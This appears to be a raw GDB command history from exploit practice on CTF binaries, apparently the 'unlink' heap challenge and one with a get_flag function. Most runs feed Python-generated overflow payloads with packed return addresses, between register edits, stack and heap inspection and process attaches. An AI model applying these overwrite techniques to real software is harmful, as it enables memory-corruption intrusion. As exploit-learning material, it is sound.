i f
x/wx $ebp
x/wx $ebp+4
x/wx $ebp
ni
x/wx $ebp
x/wx $ebp+4
x/2wx 0x0804b430
ni
i f
x/wx $ebp+4
x/wx $ebp
x/wx $ebp+4
i f
ni
r <<< $(python -c 'print "D"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"*5')
c
ni
0xffffcb80 0x804b410
p/x 0x804b410+32
set $eax=0x804b430
ni
set $eax=0xffffcb80-40-4
ni
x/wx $ebp
x/2wx $ebp
ni
ni
x/wx $esp
r <<< $(python -c 'print "D"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"*5')
c
ni
set $eax=0x804b430
x/wx $eax
ni
set $eax=0xffffcb80-40-4
ni
x/wx $ebp
x/3wx $ebp
x/3wx 0x0804b430
ni
r <<< $(python -c 'print "D"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"*5')
si
si
x/wx 0xffffcb98
x/10wx 0xffffcb98
r <<< $(python -c 'print "D"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"*5')
si
i f
x/wx $ebp
x/wx $ebp+4
p 0xffffcb98-0xffffcb80
p/d 0xffffcb98-0xffffcb80
r <<< $(python -c 'print "D"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"*5')
c
ni
set $eax=0x804b430
ni
ni
set $eax=0x804b430
set $eax=0xffffcb80+24-4
x/wx $eax
x/wx $eax+4
x/wx $eax+8
ni
x/wx $eax+4
p/x $ebp
r <<< $(python -c 'print "D"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"*5')
c
ni
set $eax=0x804b430
ni
set $eax=0xffffcb80-40-4
ni
x/wx $ebp
x/4wx $ebp
ni
i f
x/4wx $ebp
ni
r <<< $(python -c 'print "D"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"*5')
c
ni
set $eax=0x804b430
ni
set $eax=0xffffcb80-40-8
ni
ni
i f
ni
r <<< $(python -c 'print "D"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"*5')
c
ni
set $eax=0x804b430
ni
set $eax=0xffffcb80-40-4
ni
x/wx 0xffffcb54
x/wx 0xffffcb54+4
x/wx 0xffffcb98
x/2wx 0xffffcb98
[Br <<< $(python -c 'print "D"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"')
c
ni
set $eax=0x804b430
ni
set $eax=0xffffcb80-40-4
ni
ni
x/wx $ebp-0xc
x/3wx $ebp-0xc
x/3wx $ebp-0xc
x/6wx $ebp-0xc
x/6wx $ebp
x/6wx $ebp-10
x/10wx $ebp-10
x/20wx $ebp-10
x/20wx $ebp-12
x/20wx $ebp-22
x/20wx $ebp-32
disas main 
br *0x0000000000400759
r
p/d $rax
c
disas main 
br *0x000000000040063b
r
x/s $rbp-0x30
disas main
br *0x0000000000400689
c
x/s $rbp-0x30
disas main
br *0x00000000004006ad
c
x/s $rbp-0x30
disas get_flag 
br *0x000000000040094a
r
r
r
x/s $rbp-0x0b
x/s $rbp-0xb0
x/wx $rbp-0xb0
x/5wx $rbp-0xb0
x/15wx $rbp-0xb0
x/16wx $rbp-0xb0
x/18wx $rbp-0xb0
x/28wx $rbp-0xb0
disas unlink 
br *0x080485d1
[Br <<< $(python -c 'print "A"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"')
r <<< $(python -c 'print "A"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"')
disas unlink
br *0x080485ba
r <<< $(python -c 'print "A"*16+"BBBB"+"CCCC"+"DDDD"+"\xb4\x85\x04\x08"')
ni
set $eax=0x804b430
x/wx $eax
ni
set $eax=0xffffcb80-40-4
x/wx $eax
x/wx $eax+4
x/wx 0xffffcb98
x/wx 0xffffcb98+4
p/x $eax
ni
i f
ni
c
attach 29837
c
disas main
br *0x080486eb
br *0x080486df
attach 29926
c
attach 30005
c
ni
ni
ni
x/wx $eax
x/wx $eax+4
x/4wx $eax
x/wx 0x09be2428
attach 30431
c
ni
disas main
file ./unlink
disas main 
br *0x080486bd
disas unlink 
br *0x080485ba
attach 31148
c
disas main
x/wx $ebp-0x18
x/20wx 0x08dc3410
x/20wx 0x08dc3410+8
c
attach 31591
c
attach 31724
c
attach 31797
c
attach 32122
c
attach 32192
info breakpoints 
c
attach 32301
c
attach 2167
disas main
br *0x080486df
br *0x080486eb
c
attach 2292
c
attach 2167
disas main
br *0x080486df
br *0x080486eb
c
attach 2292
c
disas unlink 
br *0x080485b7
r <<< $(python -c 'print "\x9b\x85\x04\x08"+"A"*12+"BBBBCCCC"')
ni
0xffffcb80 0x804b410
set $eax=0xffffcb80+0x14
ni
set $eax=0x804b410+0xc
ni
x/wx $edx
x/wx 0xffffcbb0
x/5wx 0xffffcbb0
x/wx 0xffffcc44
x/wx 0xffffce73
ni
i f
ni
ni
i f
ni
i f
ni
i f
ni
ni
c
